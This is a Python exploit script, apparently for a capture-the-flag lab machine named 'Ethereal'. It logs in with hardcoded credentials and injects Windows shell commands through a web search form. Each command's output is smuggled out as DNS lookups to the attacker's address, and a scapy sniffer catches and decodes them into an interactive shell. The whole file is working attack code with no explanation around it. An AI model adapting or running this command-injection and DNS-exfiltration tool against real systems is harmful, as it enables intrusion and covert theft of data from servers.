#!/usr/bin/env python3

import requests
import sys
import time
from bs4 import BeautifulSoup
from cmd import Cmd
from requests.auth import HTTPBasicAuth
from scapy.all import *
from threading import Thread


kill_domain = "0xdf.0xdf."


class dns_sniff(Thread):

    def __init__(self, interface='tun0', target_ip='10.10.10.106'):
        super().__init__()
        self.interface = interface
        self.target_ip = target_ip


    def run(self):
        print(f"[*] Starting DNS Sniffer on {self.interface} for target {self.target_ip}.")
        sniff(iface=self.interface, filter=f"src host {self.target_ip} and udp port 53", 
                prn=self.parse_packet, stop_filter=lambda p: p.haslayer(DNS) and 
                p.getlayer(DNS).qd.qname.decode('utf-8') == kill_domain)
        print(f"[*] Received kill packet. Shutting down sniffer thread.")


    def parse_packet(self, p):
        if p.haslayer(DNS) and p.getlayer(DNS).qd.qtype == 1:
            domain = p.getlayer(DNS).qd.qname.decode('utf-8')
            if domain == kill_domain: return
            print(domain[1:-2].replace('X.Q',' ').strip())
            reply = IP(dst=p[IP].src)/UDP(dport=p[UDP].sport, sport=53)/DNS(id=p[DNS].id,
                    ancount=1, an=DNSRR(rrname=p[DNSQR].qname, rdata='127.0.0.1')/DNSRR(rrname=domain,
                    rdata='127.0.0.1'))
            send(reply, verbose=0, iface=self.interface)

class Terminal(Cmd):
    prompt = "ethereal> "


    def __init__(self, proxy=None):
        super().__init__()
        self.proxy = proxy or {}
        self.auth = HTTPBasicAuth('alan','!C414m17y57r1k3s4g41n!')
        self.do_login()
        self.fail_count = 0


    def do_login(self, args=''):
        print("[*] Logging in and fetching state information.")
        print(self.proxy)
        resp = requests.get('http://ethereal.htb:8080/', auth=self.auth)
        soup = BeautifulSoup(resp.text, 'html.parser')
        self.view_state = soup.find("input", id="__VIEWSTATE").get('value')
        self.view_state_gen = soup.find("input", id="__VIEWSTATEGENERATOR").get('value')
        self.event_val = soup.find("input", id="__EVENTVALIDATION").get('value')
        print("[+] State information received.")


    def send_post(self, search):
        data = {'__VIEWSTATE': self.view_state,
                '__VIEWSTATEGENERATOR': self.view_state_gen,
                '__EVENTVALIDATION': self.event_val, 
                'search': search, 
                'ctl02': ''}
        try:
            start = time.time()
            resp = requests.post('http://ethereal.htb:8080/', 
                             proxies=self.proxy,
                             data = data,
                             auth = self.auth,
                             timeout=120)
            if resp.status_code == 500 and time.time() - start < 30:
                print("[-] Unable to connect to Ethereal\n[*] Running login")
                self.do_login()
                print("[*] Try running the command again.")
        except requests.exceptions.Timeout:
            pass


    def do_exit(self, args=''):
        print("[*] Sending kill request.")
        self.send_post(f'& nslookup {kill_domain} 10.10.16.28')
        sys.exit()

    
    def default(self, args):
        command = f'''& (FOR /F "tokens=1-26" %a IN ('{args}') DO ( nslookup "Q%aX.Q%bX.Q%cX.Q%dX.Q%eX.Q%fX.Q%gX.Q%hX.Q%iX.Q%jX.Q%kX.Q%lX.Q%mX.Q%nX.Q%oX.Q%pX.Q%qX.Q%rX.Q%sX.Q%tX.Q%uX.Q%vX.Q%wX.Q%xX.Q%yX.Q%zX" 10.10.16.28 ))'''
        self.send_post(command)


    def do_quiet(self, args):
        command = f'& ( {args} )'
        self.send_post(command)


#dns = dns_sniff(interface='eth0', target_ip='10.1.1.153')
dns = dns_sniff()
dns.start()

term = Terminal(proxy={"http": "http://127.0.0.1:8080"})
try:
    term.cmdloop()
except KeyboardInterrupt:
    term.do_exit()
